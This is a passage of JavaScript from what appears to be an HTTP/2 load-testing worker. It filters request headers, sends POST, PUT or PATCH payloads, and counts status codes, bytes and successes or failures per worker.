      if (!['host', 'connection', 'keep-alive', 'transfer-encoding', 'upgrade', 'proxy-connection'].includes(key.toLowerCase()) &&
          !key.startsWith(':')) {
        headers[key.toLowerCase()] = value;
      }
    }
    
    // Add content-type header for POST/PUT requests
    if (['POST', 'PUT', 'PATCH'].includes(requestOptions.method)) {
      if (!headers['content-type']) {
        headers['content-type'] = 'application/x-www-form-urlencoded';
      }
    }
    
    const req = client.request(headers);
    
    let responseData = Buffer.alloc(0);
    let statusCode = null;
    
    req.on('response', (headers) => {
      statusCode = headers[':status'];
      workerStats.statusCodes[statusCode] = (workerStats.statusCodes[statusCode] || 0) + 1;
    });
    
    req.on('data', (chunk) => {
      responseData = Buffer.concat([responseData, chunk]);
      workerStats.bytesReceived += chunk.length;
    });
    
    req.on('end', () => {
      const requestEnd = performance.now();
      
      if (statusCode) {
        if (statusCode >= 200 && statusCode < 400) {
          workerStats.successful++;
        } else {
          workerStats.failed++;
        }
      } else {
        workerStats.failed++;
      }
      
      workerStats.requests++;
      try {
        client.close();
      } catch (e) {
        // Ignore close errors
      }
    });
    
    req.on('error', () => {
      workerStats.failed++;
      workerStats.requests++;
      try {
        client.close();
      } catch (e) {
        // Ignore close errors
      }
    });
    
    // Send payload if applicable
    if (['POST', 'PUT', 'PATCH'].includes(requestOptions.method)) {
      // Default to empty payload if none provided
      let payload = payloadData;
      if (!payload && requestOptions.method !== 'GET') {
        payload = `data=${Date.now()}`;
      }
      
      if (payload) {
        const buffer = Buffer.from(payload);
        workerStats.bytesSent += buffer.length;
        req.write(buffer);
      }
    }
    
    req.end();
  }
}